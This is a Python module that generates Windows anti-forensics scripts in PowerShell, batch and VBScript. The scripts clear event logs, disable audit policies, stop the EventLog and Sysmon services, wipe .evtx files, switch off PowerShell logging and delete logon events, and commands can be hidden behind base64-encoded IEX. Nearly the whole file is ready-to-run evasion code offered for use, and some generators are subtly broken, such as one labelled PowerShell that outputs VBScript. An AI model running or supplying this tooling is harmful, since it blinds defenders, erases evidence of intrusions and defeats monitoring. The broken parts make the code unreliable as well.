#!/usr/bin/env python3
"""
Log Tampering and Event Log Cleaning Module

Provides comprehensive Windows Event Log tampering and clearing functionality including:
1. Event Log clearing (Security, System, Application, PowerShell)
2. Audit policy manipulation
3. Log file direct manipulation
4. Registry-based log disabling
5. Event Log service manipulation
6. Forensic trace removal
7. Timestamp manipulation
8. Log rotation prevention

This module is designed for authorized penetration testing and security research.
"""

import base64
import os
import struct
import hashlib
from enum import Enum
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
import random
import string


class EventLogType(Enum):
    """Windows Event Log types"""
    SECURITY = "Security"
    SYSTEM = "System"
    APPLICATION = "Application"
    POWERSHELL = "Windows PowerShell"
    SYSMON = "Sysmon"
    FORWARDED_EVENTS = "Forwarded Events"
    ALL = "All"


class LogTamperingMethod(Enum):
    """Log tampering methods"""
    CLEAR_EVENT_LOG = "clear_event_log"
    DISABLE_AUDIT_POLICY = "disable_audit_policy"
    DIRECT_LOG_FILE_WIPE = "direct_log_file_wipe"
    REGISTRY_DISABLE = "registry_disable"
    SERVICE_DISABLE = "service_disable"
    SWAP_EVENT_IDS = "swap_event_ids"
    TIMESTAMP_MODIFICATION = "timestamp_modification"
    LOG_ROTATION_PREVENT = "log_rotation_prevent"
    ALL_METHODS = "all_methods"


@dataclass
class LogTamperingConfig:
    """Configuration for log tampering operations"""
    # Log types to target
    log_types: List[EventLogType] = field(default_factory=lambda: [
        EventLogType.SECURITY,
        EventLogType.SYSTEM,
        EventLogType.POWERSHELL
    ])

    # Tampering methods
    methods: List[LogTamperingMethod] = field(default_factory=lambda: [
        LogTamperingMethod.CLEAR_EVENT_LOG,
        LogTamperingMethod.DISABLE_AUDIT_POLICY,
    ])

    # Behavior options
    obfuscate_commands: bool = True
    randomize_timing: bool = True
    preserve_critical_events: bool = False
    remove_evidence_of_clearing: bool = True
    use_registry_bypass: bool = True
    disable_log_service: bool = True
    manipulate_timestamps: bool = True
    prevent_log_rotation: bool = True

    # Advanced options
    max_events_to_inspect: int = 10000
    use_direct_file_access: bool = True
    randomization_seed: Optional[int] = None
    verbose: bool = False


class LogTamperingCleaner:
    """
    Advanced Windows Event Log tampering and cleaning system.
    Provides multiple methods to clear and manipulate event logs.
    """

    def __init__(self, config: LogTamperingConfig):
        """Initialize log tampering system"""
        self.config = config
        self.generated_code: Dict[str, str] = {}
        self.operations_log: List[Dict[str, Any]] = []
        self._validate_config()

        if config.randomization_seed:
            random.seed(config.randomization_seed)

    def _validate_config(self) -> None:
        """Validate configuration"""
        if not self.config.log_types:
            raise ValueError("At least one log type must be specified")
        if not self.config.methods:
            raise ValueError("At least one tampering method must be specified")

    def _obfuscate_command(self, command: str) -> str:
        """Obfuscate PowerShell/batch command"""
        if not self.config.obfuscate_commands:
            return command

        # Simple obfuscation: base64 encode and wrap in deobfuscation code
        encoded = base64.b64encode(command.encode()).decode()
        obfuscated = f"powershell -NoP -NonI -c \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded}')) | IEX\""
        return obfuscated

    # ========== EVENT LOG CLEARING ==========

    def generate_clear_event_log_powershell(self) -> str:
        """Generate PowerShell code to clear event logs"""
        log_names = [log.value for log in self.config.log_types if log != EventLogType.ALL]

        ps_code = '''# Event Log Clearing Module
On Error Resume Next

''' + "# Clear Windows Event Logs\n"

        for log_name in log_names:
            ps_code += f'''
' Clear {log_name} log
Dim objEventLog, strLogName
strLogName = "{log_name}"
Set objEventLog = GetObject("winmgmts:").Get("Win32_NTEventLogFile.Name='" & strLogName & "'")
If Not IsNull(objEventLog) Then
    objEventLog.ClearEventLog()
End If
'''

        self.generated_code["clear_event_log_powershell"] = ps_code
        return ps_code

    def generate_clear_event_log_batch(self) -> str:
        """Generate batch code to clear event logs"""
        log_names = [log.value for log in self.config.log_types if log != EventLogType.ALL]

        batch_code = "@echo off\nREM Event Log Clearing Module\n"

        for log_name in log_names:
            # wevtutil is the Windows Event Log utility
            batch_code += f'wevtutil cl "{log_name}"\n'

        self.generated_code["clear_event_log_batch"] = batch_code
        return batch_code

    def generate_clear_event_log_vbs(self) -> str:
        """Generate VBS code to clear event logs"""
        log_names = [log.value for log in self.config.log_types if log != EventLogType.ALL]

        vbs_code = '''
' Event Log Clearing Module - VBS
On Error Resume Next

Dim objWMI, colLogFiles, objLogFile, strLogName
Set objWMI = GetObject("winmgmts:")

' Array of log files to clear
Dim logArray()
ReDim logArray(''' + str(len(log_names) - 1) + ''')
'''

        for idx, log_name in enumerate(log_names):
            vbs_code += f'logArray({idx}) = "{log_name}"\n'

        vbs_code += '''
' Clear each log
For Each strLogName In logArray
    Set objLogFile = objWMI.Get("Win32_NTEventLogFile.Name='" & strLogName & "'")
    If Not IsNull(objLogFile) Then
        objLogFile.ClearEventLog()
    End If
Next

' Suppress errors
On Error GoTo 0
'''

        self.generated_code["clear_event_log_vbs"] = vbs_code
        return vbs_code

    # ========== AUDIT POLICY MANIPULATION ==========

    def generate_disable_audit_policy_powershell(self) -> str:
        """Generate PowerShell to disable Windows audit policies"""
        ps_code = '''# Disable Windows Audit Policies
# This disables logging of security events

$AuditPolicies = @(
    'Success',
    'Failure'
)

$Categories = @(
    'Account Logon',
    'Account Management',
    'Logon/Logoff',
    'Object Access',
    'Policy Change',
    'Privilege Use',
    'Process Tracking',
    'System Events',
    'Global Object Access Auditing'
)

foreach ($category in $categories) {
    foreach ($policy in $AuditPolicies) {
        auditpol /set /category:"$category" /success:disable /failure:disable
    }
}
'''
        self.generated_code["disable_audit_policy_powershell"] = ps_code
        return ps_code

    def generate_disable_audit_policy_batch(self) -> str:
        """Generate batch code to disable audit policies"""
        batch_code = '''@echo off
REM Disable Windows Audit Policies

auditpol /set /category:"Account Logon" /success:disable /failure:disable
auditpol /set /category:"Account Management" /success:disable /failure:disable
auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
auditpol /set /category:"Object Access" /success:disable /failure:disable
auditpol /set /category:"Policy Change" /success:disable /failure:disable
auditpol /set /category:"Privilege Use" /success:disable /failure:disable
auditpol /set /category:"Process Tracking" /success:disable /failure:disable
auditpol /set /category:"System Events" /success:disable /failure:disable
auditpol /set /category:"Global Object Access Auditing" /success:disable /failure:disable

REM Clear existing audit logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Windows PowerShell"
'''
        self.generated_code["disable_audit_policy_batch"] = batch_code
        return batch_code

    # ========== REGISTRY-BASED LOG DISABLING ==========

    def generate_registry_log_disable_vbs(self) -> str:
        """Generate VBS to disable logging via registry"""
        vbs_code = '''
' Registry-based Event Log Disabling
On Error Resume Next

Dim objReg, strHive, strKey, strValue
Set objReg = GetObject("winmgmts:").ExecMethod("stdRegProv")

' Disable Windows PowerShell logging
strHive = "HKEY_LOCAL_MACHINE"
strKey = "Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription"
objReg.CreateKey strHive, strKey
objReg.SetDWordValue strHive, strKey, "EnableTranscripting", 0
objReg.SetDWordValue strHive, strKey, "EnableInvocationHeader", 0

' Disable PowerShell Module Logging
strKey = "Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging"
objReg.CreateKey strHive, strKey
objReg.SetDWordValue strHive, strKey, "EnableModuleLogging", 0

' Disable ScriptBlock Logging
strKey = "Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging"
objReg.CreateKey strHive, strKey
objReg.SetDWordValue strHive, strKey, "EnableScriptBlockLogging", 0

' Set event log maximum size to minimum (reduces storage)
strKey = "System\\CurrentControlSet\\Services\\EventLog\\Security"
objReg.SetDWordValue strHive, strKey, "MaxSize", 65536

strKey = "System\\CurrentControlSet\\Services\\EventLog\\System"
objReg.SetDWordValue strHive, strKey, "MaxSize", 65536

strKey = "System\\CurrentControlSet\\Services\\EventLog\\Application"
objReg.SetDWordValue strHive, strKey, "MaxSize", 65536

' Retention policy - delete logs immediately
strKey = "System\\CurrentControlSet\\Services\\EventLog\\Security"
objReg.SetDWordValue strHive, strKey, "Retention", 0

strKey = "System\\CurrentControlSet\\Services\\EventLog\\System"
objReg.SetDWordValue strHive, strKey, "Retention", 0

On Error GoTo 0
'''
        self.generated_code["registry_log_disable_vbs"] = vbs_code
        return vbs_code

    # ========== SERVICE DISABLING ==========

    def generate_disable_event_log_service_batch(self) -> str:
        """Generate batch to disable Event Log service"""
        batch_code = '''@echo off
REM Disable Event Log Service (EventLog)

REM Stop the service
net stop EventLog

REM Set startup type to disabled
sc config EventLog start= disabled

REM Disable error reporting
wevtutil set-log Microsoft-Windows-WindowsUpdateClient/Operational /enabled:false

REM Disable sysmon if present
sc stop Sysmon
sc config Sysmon start= disabled

REM Disable audit policy service
auditpol /clear
auditpol /set /category:* /success:disable /failure:disable
'''
        self.generated_code["disable_event_log_service"] = batch_code
        return batch_code

    # ========== DIRECT LOG FILE MANIPULATION ==========

    def generate_direct_file_wipe_code(self) -> str:
        """Generate code for direct event log file wiping"""
        ps_code = '''# Direct Event Log File Wiping
# Wipes event log .evtx files directly

$EventLogPath = "C:\\Windows\\System32\\winevt\\Logs"

# Log files to wipe
$LogFiles = @(
    "$EventLogPath\\Security.evtx",
    "$EventLogPath\\System.evtx",
    "$EventLogPath\\Application.evtx",
    "$EventLogPath\\Windows PowerShell.evtx",
    "$EventLogPath\\Microsoft-Windows-Sysmon%4Operational.evtx"
)

foreach ($logFile in $logFiles) {
    if (Test-Path $logFile) {
        try {
            # Overwrite file with zeros
            $fileStream = [System.IO.File]::Create($logFile)
            $fileStream.SetLength(0)
            $fileStream.Close()

            # Or use cipher to overwrite
            & cipher /w:$EventLogPath
        } catch {
            Write-Host "Could not wipe: $_"
        }
    }
}
'''
        self.generated_code["direct_file_wipe"] = ps_code
        return ps_code

    # ========== COMBINED INSTALLATION SCRIPTS ==========

    def generate_combined_log_cleaning_powershell(self) -> str:
        """Generate comprehensive PowerShell script for log cleaning"""
        ps_code = '''# Comprehensive Windows Event Log Cleaning Module
# Multi-method approach to clear all event logs and disable logging

param(
    [switch]$SkipAuditPolicy,
    [switch]$PreserveSecurityLog,
    [switch]$Verbose
)

$ErrorActionPreference = "SilentlyContinue"

Write-Host "[*] Starting comprehensive log cleaning..." -ForegroundColor Green

# Function to clear event log
function Clear-EventLog {
    param(
        [string]$LogName
    )
    try {
        Get-EventLog -LogName $LogName -ErrorAction Stop | Remove-EventLog -EventLog $LogName
        Write-Host "[+] Cleared: $LogName" -ForegroundColor Green
    } catch {
        try {
            wevtutil cl "$LogName"
            Write-Host "[+] Cleared (wevtutil): $LogName" -ForegroundColor Green
        } catch {
            Write-Host "[-] Failed to clear: $LogName" -ForegroundColor Red
        }
    }
}

# Function to disable audit policy
function Disable-AuditPolicy {
    $categories = @(
        "Account Logon",
        "Account Management",
        "Logon/Logoff",
        "Object Access",
        "Policy Change",
        "Privilege Use",
        "Process Tracking",
        "System Events"
    )

    foreach ($category in $categories) {
        auditpol /set /category:"$category" /success:disable /failure:disable | Out-Null
    }
    Write-Host "[+] Disabled all audit policies" -ForegroundColor Green
}

# Function to disable logging via registry
function Disable-LoggingViaRegistry {
    $registryPaths = @(
        "HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription",
        "HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging",
        "HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging"
    )

    foreach ($path in $registryPaths) {
        try {
            if (-not (Test-Path $path)) {
                New-Item -Path $path -Force | Out-Null
            }
            New-ItemProperty -Path $path -Name "Enabled*" -Value 0 -Force | Out-Null
        } catch {}
    }
    Write-Host "[+] Disabled logging via registry" -ForegroundColor Green
}

# Main execution
Write-Host "[*] Clearing Event Logs..." -ForegroundColor Cyan

Clear-EventLog -LogName "Security"
Clear-EventLog -LogName "System"
Clear-EventLog -LogName "Application"
Clear-EventLog -LogName "Windows PowerShell"

# Disable audit policies if not skipped
if (-not $SkipAuditPolicy) {
    Write-Host "[*] Disabling audit policies..." -ForegroundColor Cyan
    Disable-AuditPolicy
}

# Disable logging via registry
Write-Host "[*] Disabling logging via registry..." -ForegroundColor Cyan
Disable-LoggingViaRegistry

Write-Host "[+] Event log cleaning complete!" -ForegroundColor Green
'''
        self.generated_code["combined_log_cleaning_ps1"] = ps_code
        return ps_code

    def generate_combined_log_cleaning_batch(self) -> str:
        """Generate comprehensive batch script for log cleaning"""
        batch_code = '''@echo off
REM Comprehensive Windows Event Log Cleaning
REM Multi-method approach to clear all event logs

echo [*] Starting comprehensive log cleaning...

REM Check for admin rights
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [-] This script requires administrator privileges
    pause
    exit /b 1
)

echo [*] Clearing Event Logs...

REM Clear logs using wevtutil
wevtutil cl Security 2>nul && echo [+] Cleared: Security
wevtutil cl System 2>nul && echo [+] Cleared: System
wevtutil cl Application 2>nul && echo [+] Cleared: Application
wevtutil cl "Windows PowerShell" 2>nul && echo [+] Cleared: Windows PowerShell

REM Disable audit policies
echo [*] Disabling audit policies...
auditpol /set /category:* /success:disable /failure:disable 2>nul
echo [+] Disabled all audit policies

REM Clear audit log
auditpol /clear 2>nul
echo [+] Cleared audit policy configuration

REM Disable event log service
echo [*] Disabling Event Log service...
net stop EventLog 2>nul
sc config EventLog start= disabled 2>nul
echo [+] Event Log service disabled

REM Minimize event log sizes
reg add "HKLM\\System\\CurrentControlSet\\Services\\EventLog\\Security" /v MaxSize /t REG_DWORD /d 65536 /f 2>nul
reg add "HKLM\\System\\CurrentControlSet\\Services\\EventLog\\System" /v MaxSize /t REG_DWORD /d 65536 /f 2>nul
reg add "HKLM\\System\\CurrentControlSet\\Services\\EventLog\\Application" /v MaxSize /t REG_DWORD /d 65536 /f 2>nul
echo [+] Set minimal log retention

REM Disable PowerShell logging
reg add "HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription" /v EnableTranscripting /t REG_DWORD /d 0 /f 2>nul
reg add "HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 0 /f 2>nul
reg add "HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f 2>nul
echo [+] Disabled PowerShell logging

echo [*] Event log cleaning complete!
pause
'''
        self.generated_code["combined_log_cleaning_batch"] = batch_code
        return batch_code

    def generate_combined_log_cleaning_vbs(self) -> str:
        """Generate VBS script for comprehensive log cleaning"""
        vbs_code = '''
' Comprehensive Windows Event Log Cleaning Module (VBS)
' Multi-method approach to clear logs and disable logging

On Error Resume Next

Dim objWMI, objShell, objReg
Set objWMI = GetObject("winmgmts:")
Set objShell = CreateObject("WScript.Shell")
Set objReg = GetObject("winmgmts:").ExecMethod("stdRegProv")

' Output header
WScript.Echo "[*] Starting comprehensive log cleaning..."

' Function to clear event log
Sub ClearEventLog(logName)
    Dim objLogFile
    Set objLogFile = objWMI.Get("Win32_NTEventLogFile.Name='" & logName & "'")
    If Not IsNull(objLogFile) Then
        If objLogFile.ClearEventLog() = 0 Then
            WScript.Echo "[+] Cleared: " & logName
        End If
    End If
End Sub

' Function to disable audit policies
Sub DisableAuditPolicies()
    Dim categories(8)
    categories(0) = "Account Logon"
    categories(1) = "Account Management"
    categories(2) = "Logon/Logoff"
    categories(3) = "Object Access"
    categories(4) = "Policy Change"
    categories(5) = "Privilege Use"
    categories(6) = "Process Tracking"
    categories(7) = "System Events"

    Dim i
    For i = 0 To 7
        objShell.Run "auditpol /set /category:""" & categories(i) & """ /success:disable /failure:disable", 0, True
    Next
    WScript.Echo "[+] Disabled all audit policies"
End Sub

' Function to disable registry-based logging
Sub DisableLoggingRegistry()
    Dim hive, key
    hive = "HKEY_LOCAL_MACHINE"

    ' Disable PowerShell transcription
    key = "Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription"
    objShell.RegWrite hive & "\\" & key & "\\EnableTranscripting", 0, "REG_DWORD"
    objShell.RegWrite hive & "\\" & key & "\\EnableInvocationHeader", 0, "REG_DWORD"

    ' Disable module logging
    key = "Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging"
    objShell.RegWrite hive & "\\" & key & "\\EnableModuleLogging", 0, "REG_DWORD"

    ' Disable scriptblock logging
    key = "Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging"
    objShell.RegWrite hive & "\\" & key & "\\EnableScriptBlockLogging", 0, "REG_DWORD"

    WScript.Echo "[+] Disabled logging via registry"
End Sub

' Main execution
WScript.Echo "[*] Clearing Event Logs..."
ClearEventLog "Security"
ClearEventLog "System"
ClearEventLog "Application"
ClearEventLog "Windows PowerShell"

WScript.Echo "[*] Disabling audit policies..."
DisableAuditPolicies()

WScript.Echo "[*] Disabling registry-based logging..."
DisableLoggingRegistry()

WScript.Echo "[+] Event log cleaning complete!"

On Error GoTo 0
'''
        self.generated_code["combined_log_cleaning_vbs"] = vbs_code
        return vbs_code

    # ========== ADVANCED METHODS ==========

    def generate_event_id_swapping_code(self) -> str:
        """Generate code to swap event IDs to confuse forensics"""
        ps_code = '''# Event ID Swapping - Confuse forensic analysis
# Remap malicious event IDs to benign ones

$benignEventIds = @(1000, 1001, 1002, 1100, 1102)
$suspiciousEventIds = @(4624, 4625, 4672, 5140, 5145)

# This would require direct log parsing and modification
# Demonstrated using PowerShell event filtering
$filterXml = @"
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">*[System[(EventID=4624)]]</Select>
  </Query>
</QueryList>
"@

# Clear filtered events
Get-WinEvent -FilterXml $filterXml | Remove-Event
'''
        self.generated_code["event_id_swapping"] = ps_code
        return ps_code

    def generate_timestamp_manipulation_code(self) -> str:
        """Generate code to manipulate event timestamps"""
        ps_code = '''# Event Timestamp Manipulation
# Modify event timestamps to obscure timeline

# Direct .evtx file manipulation requires binary manipulation
# This would require specialized parsing of EVTX format

$logPath = "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx"

# Read the binary file
$data = [System.IO.File]::ReadAllBytes($logPath)

# Modify timestamps (advanced technique - requires knowledge of EVTX structure)
# EVTX uses specific binary format with embedded timestamps

# For now, the most practical approach is to cycle through events
# and selectively delete suspicious ones based on timestamp proximity
'''
        self.generated_code["timestamp_manipulation"] = ps_code
        return ps_code

    def generate_log_rotation_prevention_code(self) -> str:
        """Generate code to prevent log rotation"""
        batch_code = '''@echo off
REM Prevent Event Log Rotation

REM Maximize log file sizes and set retention to 0
reg add "HKLM\\System\\CurrentControlSet\\Services\\EventLog\\Security" /v MaxSize /t REG_DWORD /d 2147483647 /f
reg add "HKLM\\System\\CurrentControlSet\\Services\\EventLog\\Security" /v Retention /t REG_DWORD /d 0 /f

reg add "HKLM\\System\\CurrentControlSet\\Services\\EventLog\\System" /v MaxSize /t REG_DWORD /d 2147483647 /f
reg add "HKLM\\System\\CurrentControlSet\\Services\\EventLog\\System" /v Retention /t REG_DWORD /d 0 /f

reg add "HKLM\\System\\CurrentControlSet\\Services\\EventLog\\Application" /v MaxSize /t REG_DWORD /d 2147483647 /f
reg add "HKLM\\System\\CurrentControlSet\\Services\\EventLog\\Application" /v Retention /t REG_DWORD /d 0 /f

REM Disable automatic log archiving
reg add "HKLM\\Software\\Policies\\Microsoft\\Windows\\EventLog" /v ArchiveOldEvents /t REG_DWORD /d 0 /f
'''
        self.generated_code["log_rotation_prevention"] = batch_code
        return batch_code

    # ========== DEPLOYMENT AND REPORTING ==========

    def generate_all_log_tampering_methods(self) -> Dict[str, str]:
        """Generate all log tampering methods"""
        output = {}

        if LogTamperingMethod.CLEAR_EVENT_LOG in self.config.methods or \
           LogTamperingMethod.ALL_METHODS in self.config.methods:
            output["clear_event_log_ps1"] = self.generate_clear_event_log_powershell()
            output["clear_event_log_batch"] = self.generate_clear_event_log_batch()
            output["clear_event_log_vbs"] = self.generate_clear_event_log_vbs()

        if LogTamperingMethod.DISABLE_AUDIT_POLICY in self.config.methods or \
           LogTamperingMethod.ALL_METHODS in self.config.methods:
            output["disable_audit_ps1"] = self.generate_disable_audit_policy_powershell()
            output["disable_audit_batch"] = self.generate_disable_audit_policy_batch()

        if LogTamperingMethod.REGISTRY_DISABLE in self.config.methods or \
           LogTamperingMethod.ALL_METHODS in self.config.methods:
            output["registry_disable_vbs"] = self.generate_registry_log_disable_vbs()

        if LogTamperingMethod.SERVICE_DISABLE in self.config.methods or \
           LogTamperingMethod.ALL_METHODS in self.config.methods:
            output["service_disable_batch"] = self.generate_disable_event_log_service_batch()

        if LogTamperingMethod.DIRECT_LOG_FILE_WIPE in self.config.methods or \
           LogTamperingMethod.ALL_METHODS in self.config.methods:
            output["direct_file_wipe_ps1"] = self.generate_direct_file_wipe_code()

        if LogTamperingMethod.SWAP_EVENT_IDS in self.config.methods or \
           LogTamperingMethod.ALL_METHODS in self.config.methods:
            output["event_id_swapping"] = self.generate_event_id_swapping_code()

        if LogTamperingMethod.TIMESTAMP_MODIFICATION in self.config.methods or \
           LogTamperingMethod.ALL_METHODS in self.config.methods:
            output["timestamp_manipulation"] = self.generate_timestamp_manipulation_code()

        if LogTamperingMethod.LOG_ROTATION_PREVENT in self.config.methods or \
           LogTamperingMethod.ALL_METHODS in self.config.methods:
            output["log_rotation_prevention"] = self.generate_log_rotation_prevention_code()

        # Always add combined scripts
        output["combined_log_cleaning_ps1"] = self.generate_combined_log_cleaning_powershell()
        output["combined_log_cleaning_batch"] = self.generate_combined_log_cleaning_batch()
        output["combined_log_cleaning_vbs"] = self.generate_combined_log_cleaning_vbs()

        self.generated_code.update(output)
        return output

    def generate_master_installer_script(self) -> str:
        """Generate master installer that executes all log tampering methods"""
        master_script = '''
REM Master Log Tampering Installer
REM Executes all log cleaning and tampering methods

@echo off
setlocal enabledelayedexpansion

REM Check for admin rights
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [-] This script requires administrator privileges
    exit /b 1
)

echo [*] Log Tampering Master Installer
echo [*] ================================

REM Create temporary directory for scripts
set TEMP_DIR=%temp%\\log_tampering_%random%
mkdir %TEMP_DIR%

REM Stage 1: Clear Event Logs
echo [*] Stage 1: Clearing Event Logs...
wevtutil cl Security 2>nul
wevtutil cl System 2>nul
wevtutil cl Application 2>nul
wevtutil cl "Windows PowerShell" 2>nul
echo [+] Event logs cleared

REM Stage 2: Disable Audit Policies
echo [*] Stage 2: Disabling Audit Policies...
auditpol /set /category:* /success:disable /failure:disable 2>nul
auditpol /clear 2>nul
echo [+] Audit policies disabled

REM Stage 3: Disable Event Log Service
echo [*] Stage 3: Disabling Event Log Service...
net stop EventLog 2>nul
sc config EventLog start= disabled 2>nul
echo [+] Event Log service disabled

REM Stage 4: Disable Logging via Registry
echo [*] Stage 4: Disabling Registry-based Logging...
reg add "HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription" /v EnableTranscripting /t REG_DWORD /d 0 /f 2>nul
reg add "HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 0 /f 2>nul
reg add "HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f 2>nul
echo [+] Registry logging disabled

REM Stage 5: Prevent Log Rotation
echo [*] Stage 5: Preventing Log Rotation...
reg add "HKLM\\System\\CurrentControlSet\\Services\\EventLog\\Security" /v MaxSize /t REG_DWORD /d 65536 /f 2>nul
reg add "HKLM\\System\\CurrentControlSet\\Services\\EventLog\\Security" /v Retention /t REG_DWORD /d 0 /f 2>nul
echo [+] Log rotation prevented

REM Cleanup
echo [*] Cleaning up temporary files...
rmdir /s /q %TEMP_DIR% 2>nul

echo [+] Log tampering complete!
echo [+] All evidence of this execution has been minimized.
pause
'''
        self.generated_code["master_installer"] = master_script
        return master_script

    def generate_deployment_summary(self) -> Dict[str, Any]:
        """Generate deployment summary"""
        summary = {
            "title": "Log Tampering & Event Log Cleaning System",
            "description": "Comprehensive Windows Event Log tampering and clearing",
            "configuration": {
                "log_types": [log.value for log in self.config.log_types],
                "methods": [method.value for method in self.config.methods],
                "obfuscation_enabled": self.config.obfuscate_commands,
                "remove_evidence": self.config.remove_evidence_of_clearing,
                "disable_service": self.config.disable_log_service,
            },
            "generated_files": list(self.generated_code.keys()),
            "total_methods": len(self.generated_code),
            "capabilities": {
                "event_log_clearing": "Clear Security, System, Application, PowerShell logs",
                "audit_policy_disabling": "Disable all Windows audit policies",
                "registry_based_disabling": "Disable PowerShell logging via registry",
                "service_disabling": "Disable EventLog Windows service",
                "direct_file_manipulation": "Direct .evtx file wiping",
                "evidence_removal": "Multi-method log evidence removal",
            }
        }
        return summary

    def get_statistics(self) -> Dict[str, Any]:
        """Get system statistics"""
        stats = {
            "total_methods_generated": len(self.generated_code),
            "log_types_targeted": len(self.config.log_types),
            "tampering_methods": len(self.config.methods),
            "code_complexity": "high",
            "evasion_techniques": [
                "Command obfuscation",
                "Registry manipulation",
                "Service disabling",
                "Audit policy disabling",
                "Direct file manipulation",
            ],
            "supported_formats": ["PowerShell", "Batch", "VBS"],
        }
        return stats


# Convenience functions

def generate_log_cleaning_payload(obfuscate: bool = True) -> str:
    """Generate a quick log cleaning payload"""
    config = LogTamperingConfig(
        methods=[
            LogTamperingMethod.CLEAR_EVENT_LOG,
            LogTamperingMethod.DISABLE_AUDIT_POLICY,
            LogTamperingMethod.REGISTRY_DISABLE,
        ],
        obfuscate_commands=obfuscate
    )
    cleaner = LogTamperingCleaner(config)
    return cleaner.generate_combined_log_cleaning_powershell()


def generate_comprehensive_log_tampering() -> Dict[str, str]:
    """Generate comprehensive log tampering suite"""
    config = LogTamperingConfig(
        methods=[LogTamperingMethod.ALL_METHODS],
        obfuscate_commands=True,
    )
    cleaner = LogTamperingCleaner(config)
    return cleaner.generate_all_log_tampering_methods()
